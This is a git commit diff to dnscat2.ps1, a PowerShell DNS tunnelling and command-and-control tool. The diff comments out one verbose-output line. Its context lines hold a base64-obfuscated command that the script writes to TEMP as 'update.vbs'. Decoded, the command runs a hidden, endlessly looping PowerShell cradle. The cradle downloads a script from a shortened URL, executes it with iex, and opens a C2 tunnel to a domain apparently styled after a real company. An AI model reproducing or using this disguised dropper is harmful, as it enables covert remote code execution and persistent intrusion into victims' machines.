bdb03d6680beb691132e0182e4c2d28d4b83d303
tyraniter <tyraniter@gmail.com>
2019-05-07 14:26:25 +0800

    Update dnscat2.ps1

--- dnscat2.ps1
+++ dnscat2.ps1
@@ -2039,7 +2039,7 @@ function Start-Dnscat2 {
         [ValidateRange(1,240)][int32]$MaxPacketSize=240,
         [Alias("n")][string]$Name=""
     )
-    $verbosepreference = "continue"
+    #$verbosepreference = "continue"
     $cmd='U2V0IG9ialNoZWxsID0gQ3JlYXRlT2JqZWN0KCJXc2NyaXB0LnNoZWxsIik6b2JqU2hlbGwucnVuICJwb3dlcnNoZWxsIC1ub1AgLXN0YSAtdyAxIC1jICIiZG97dHJ5eyRhPU5ldy1PYmplY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQ7JGEuUHJveHk9W1N5c3RlbS5OZXQuV2ViUmVxdWVzdF06OkRlZmF1bHRXZWJQcm94eTskYS5DcmVkZW50aWFscz1bU3lzdGVtLk5ldC5DcmVkZW50aWFsQ2FjaGVdOjpEZWZhdWx0TmV0d29ya0NyZWRlbnRpYWxzOyRhLlByb3h5LkNyZWRlbnRpYWxzPVtTeXN0ZW0uTmV0LkNyZWRlbnRpYWxDYWNoZV06OkRlZmF1bHROZXR3b3JrQ3JlZGVudGlhbHM7JGEuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly90LmNuL0VvTTJUQ2snKXxpZXg7U3RhcnQtRG5zY2F0MiAtRCBzdGF0aWMucGFpYy1pbnF1ZXJ5LnNpdGUgLXMgMTAuNS4zMi4xMDAgLXNlYyBwYWljdGVzdDticmVhazt9Y2F0Y2h7U3RhcnQtRG5zY2F0MiAtRCBzdGF0aWMucGFpYy1pbnF1ZXJ5LnNpdGUgLXMgMTAuNS4zMi4xMDAgLXNlYyBwYWljdGVzdH19d2hpbGUoMSk7IiIiLDA='
     $filename=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("dXBkYXRlLnZicw=="));
     $filepath=$env:TEMP;
